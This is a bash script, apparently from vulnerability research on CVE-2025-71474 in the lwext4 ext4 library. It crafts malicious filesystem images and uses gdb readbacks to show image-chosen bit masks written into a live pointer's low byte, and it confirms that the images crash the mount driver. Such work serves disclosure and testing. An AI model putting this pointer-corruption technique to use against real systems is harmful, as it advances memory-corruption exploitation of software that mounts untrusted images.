#!/usr/bin/env bash
# CVE-2025-71474 rung-4 sibling lane: image-chosen bit mask in the low byte of
# the live ext4_buf.bc pointer, on the real ext4_fs_init() mount path.
#
# ext4_fs_init_block_bitmap() (src/ext4_fs.c:332-333) walks bit_max bits past
# its one-block bcache buffer. The adjacent real ext4_buf header begins at
# data+4112 and its bc field at data+4152. s_reserved_gdt_blocks chooses the
# last bit set, hence the mask OR-ed into bc's low byte. Values are bit masks,
# not chosen addresses; no command execution and no network target.
set -u
cd "$(dirname "$0")"
pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
has() { grep -qF "$2" "$1"; }

cd real
cmake -S lwext4-upstream/vuln -B build-vuln-gdt -DLIB_ONLY=1 \
    -DCMAKE_C_FLAGS='-g -O0' > evidence/build-vuln-gdt.log 2>&1 \
    && cmake --build build-vuln-gdt -j4 >> evidence/build-vuln-gdt.log 2>&1 \
    && ok "plain vulnerable library build (gdt lane)" \
    || bad "plain vulnerable library build (gdt lane)"

gcc -g -O0 -Ilwext4-upstream/vuln/include \
    -Ilwext4-upstream/vuln/blockdev/linux -Ibuild-vuln-gdt/include \
    mount_driver.c lwext4-upstream/vuln/blockdev/linux/ext4_filedev.c \
    -Wl,--start-group build-vuln-gdt/src/liblwext4.a \
    build-vuln-gdt/blockdev/libblockdev.a -Wl,--end-group \
    -o driver-vuln-gdt > evidence/compile-vuln-gdt.log 2>&1 \
    && ok "plain gdt driver build" || bad "plain gdt driver build"

LOG=evidence/real-vuln-71474-gdt-gdb.out
: > "$LOG"
: > evidence/craft-gdt.out
# 8 is the in-bounds control; the rest set successive low-byte masks in bc.
for gdt in 8 33215 33216 33217 33218 33220 33222; do
    python3 craft_image_71474.py image-base.ext4 "image-gdt-$gdt.ext4" "$gdt" \
        >> evidence/craft-gdt.out 2>&1 || bad "craft gdt=$gdt image"
    echo "=== GDT=$gdt ===" >> "$LOG"
    gdb -q -batch \
        -ex 'set pagination off' -ex 'break ext4_fs.c:332' -ex run \
        -ex 'printf "BC_BEFORE=%p DELTA=%ld\n", block_bitmap.buf->bc, (long)((char*)block_bitmap.buf-(char*)block_bitmap.data)' \
        -ex 'advance 335' \
        -ex 'printf "BC_AFTER=%p BITBYTE=%#x\n", block_bitmap.buf->bc, *(unsigned char*)(block_bitmap.data+4152)' \
        --args ./driver-vuln-gdt mount "image-gdt-$gdt.ext4" >> "$LOG" 2>&1
done

python3 summarize_gdt_bit.py "$LOG" > evidence/real-vuln-71474-gdt-summary.out \
    && ok "gdb readback summarized" || bad "gdb readback summarized"
cat evidence/real-vuln-71474-gdt-summary.out
[ "$(grep -c 'MATCH=1$' evidence/real-vuln-71474-gdt-summary.out)" -eq 7 ] \
    && ok "chosen bit masks in live bc (7/7 gdb readbacks)" \
    || bad "chosen bit masks in live bc (7/7 gdb readbacks)"

set +e
stdbuf -o0 ./driver-vuln-gdt mount image-gdt-8.ext4 \
    > evidence/real-vuln-gdt-safe-plain.out 2>&1
safe_rc=$?
set -e
[ "$safe_rc" -eq 0 ] \
    && has evidence/real-vuln-gdt-safe-plain.out 'BG_REF_RC=0' \
    && ok "safe gdt=8 clean plain mount" || bad "safe gdt=8 clean plain mount"

for gdt in 33215 33216 33217 33218 33220 33222; do
    set +e
    ./driver-vuln-gdt mount "image-gdt-$gdt.ext4" \
        > "evidence/real-vuln-gdt-$gdt-plain.out" 2>&1
    arc=$?
    set -e
    [ "$arc" -eq 139 ] && ok "gdt=$gdt plain process faults (rc=139)" \
        || bad "gdt=$gdt plain process faults (rc=139)"
done

echo "GDT_PASS=$pass GDT_FAIL=$fail"
[ "$fail" -eq 0 ] && echo 'GDT BIT-WRITE REPLAY PASS' || echo 'GDT BIT-WRITE REPLAY FAIL'
exit "$fail"
